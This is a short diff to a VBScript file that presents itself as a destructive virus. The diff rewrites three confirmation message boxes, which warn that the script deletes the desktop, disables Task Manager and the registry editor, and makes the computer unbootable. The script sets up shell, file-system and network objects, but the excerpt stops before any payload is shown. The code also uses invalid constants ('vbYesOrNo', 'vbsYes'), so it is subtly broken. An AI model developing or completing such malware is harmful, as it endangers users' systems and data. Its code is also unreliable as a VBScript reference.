@@ -2,15 +2,15 @@ Set shell = CreateObject("Wscript.shell")
 
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
-Warning1 = Msgbox "WARNING: This virus can delete desktop, disable task manager, disable registry editor, delete the whole system, and even make your computer unbootable, Do you want to proceed?", vbYesOrNo, "WARNING"
+Warning1 = Msgbox("WARNING: This virus can delete desktop, disable task manager, disable registry editor, delete the whole system, and even make your computer unbootable, Do you want to proceed?", vbYesOrNo, "WARNING")
 
 If Warning1 = vbsYes Then
   
-Warning2 = Msgbox "SECOND WARNING: It's too destructive to even be a simple virus, just like Michelangelo, Actually Proceed?", vbYesOrNo, "SECOND WARNING"
+Warning2 = Msgbox("SECOND WARNING: It's too destructive to even be a simple virus, just like Michelangelo, Actually Proceed?", vbYesOrNo, "SECOND WARNING")
 
 If Warning2 = vbsYes Then
 
-Warning3 = Msgbox "FINAL WARNING: You Sure?", vbYesOrNo, "SECOND WARNING"
+Warning3 = Msgbox ("FINAL WARNING: You Sure?", vbYesOrNo, "SECOND WARNING")
 
 If Warning3 = vbsYes Then
 Set network = CreateObject("WScript.Network")
